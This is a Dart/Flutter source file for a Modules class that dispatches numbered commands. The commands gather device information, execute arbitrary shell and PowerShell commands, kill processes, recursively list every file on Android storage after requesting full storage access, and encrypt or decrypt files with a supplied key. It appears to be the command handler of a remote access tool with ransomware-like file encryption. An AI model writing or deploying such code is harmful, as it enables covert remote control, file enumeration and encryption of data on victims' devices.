import 'package:device_info/device_info.dart';
import 'package:flutter/cupertino.dart';
import 'dart:io';
import 'crypto.dart';
import 'system.dart';
import '../util/manipulate_data.dart';

import 'package:permission_handler/permission_handler.dart';

class Modules {
  late System _system;

  Modules() {
    _system = System();
  }

  Map map = <int, String>{};
  Future<Map> selectorFromMap({required Map map, context}) async {
    if (map.containsKey('id') &&
        map['id'].isNotEmpty &&
        ManipulateData.isInt(map['id'])) {
      int id = int.parse(map['id']);
      switch (id) {
        case 1:
          return getInfo(context);
        case 2:
          var parameter = map['parameter'].toString();

          var retn = await executableCommand(parameter);
          return retn;
        case 3:
          var parameter = map['parameter'].toString();

          var retn = await executableCommandInPowerShell(parameter);
          return retn;
        case 4:
          var parameter = map['parameter'].toString();

          if (ManipulateData.isInt(parameter)) {
            var retn = await killProcess(int.parse(parameter));
            return retn;
          }
          return {'status': false, 'response': 'parameter is not a int'};
        case 5:
          return listAllFiles();
        case 6:
          String path = map['path'];
          String key = map['key'];
          var retn = await encryptPath(path, key);
          return retn;
        case 7:
          String path = map['path'];
          String key = map['key'];
          var retn = await decryptPath(path, key);
          return retn;

        default:
          return {};
      }
    } else {
      return {};
    }
  }

  Map getInfoDesktop() {
    return _system.getInfoFromSystem();
  }

  Future<Map> executableCommand(String command) {
    return _system.executableCommand(command);
  }

  Future<Map> executableCommandInPowerShell(String command) {
    return _system.executableCommandInPowerShell(command);
  }

  Future<Map> killProcess(int pId) {
    return _system.killProcess(pId);
  }

  Future<Map> getInfo(context) async {
    String info = "";
    Locale? myLocale = context == null ? null : Localizations.localeOf(context);
    print(context == myLocale);
    print("*/*/*///*/*/");
    if (Platform.isAndroid) {
      var androidInfo = await DeviceInfoPlugin().androidInfo;
      var release = androidInfo.version.release;
      var sdkInt = androidInfo.version.sdkInt;
      var manufacturer = androidInfo.manufacturer;
      var model = androidInfo.model;
      info = 'Android $release (SDK $sdkInt), $manufacturer $model';
      return {"os": info, "lang": myLocale!.languageCode};

      // Android 9 (SDK 28), Xiaomi Redmi Note 7
    } else if (Platform.isIOS) {
      var iosInfo = await DeviceInfoPlugin().iosInfo;
      var systemName = iosInfo.systemName;
      var version = iosInfo.systemVersion;
      var name = iosInfo.name;
      var model = iosInfo.model;
      info = '$systemName $version, $name $model';
      return {"os": info, "lang": myLocale!.languageCode};

      // iOS 13.1, iPhone 11 Pro Max iPhone
    } else {
      return getInfoDesktop();
    }
  }

  Future<Map> listAllFiles() async {
    bool status = await _requestStoragePermission();
    var filesPath = {};

    if (status) {
      try {
        // Get the root directory
        Directory rootDir = Directory(
            'storage/emulated/0/'); // You can change this to another directory if needed

        // List all files in the root directory and its subdirectories
        List<FileSystemEntity> allFiles = _listFiles(rootDir);

        // Process the list of files
        for (int i = 0; i < allFiles.length; i++) {
          var file = allFiles[i];
          print('File: ${file.path}');
          filesPath.addAll({i: file.path});
        }

        return filesPath;
      } catch (e) {
        print('Error listing files: $e');
        return {0: 'Error listing files: $e'};
      }
    } else
      return {0: 'Error listing files: no permissions'};
  }

  List<FileSystemEntity> _listFiles(Directory dir) {
    List<FileSystemEntity> files = [];

    try {
      // List files and directories in the current directory
      List<FileSystemEntity> entities = dir.listSync();

      // Iterate through each entity
      for (var entity in entities) {
        if (entity is File) {
          // If it's a file, add it to the list
          files.add(entity);
        } else if (entity is Directory) {
          // If it's a directory, recursively list files in that directory
          files.addAll(_listFiles(entity));
        }
      }
    } catch (e) {
      print('Error listing files in directory ${dir.path}: $e');
    }

    return files;
  }

  // Add this function to request storage permission
  Future<bool> _requestStoragePermission() async {
    var status = await Permission.manageExternalStorage.request();

    return status.isGranted;
  }

  Future<Map> encryptPath(String path, String key) async {
    if (key.length != 32) {
      return Future.value(
          {'status': false, 'response': 'key must be 32 characters'});
    }
    var crypto = Crypto(path, key);
    return crypto.encryptFile();
  }

  Future<Map> decryptPath(String path, String key) {
    if (key.length != 32) {
      return Future.value(
          {'status': false, 'response': 'key must be 32 characters'});
    }
    var crypto = Crypto(path, key);
    return crypto.decryptFile();
  }
}
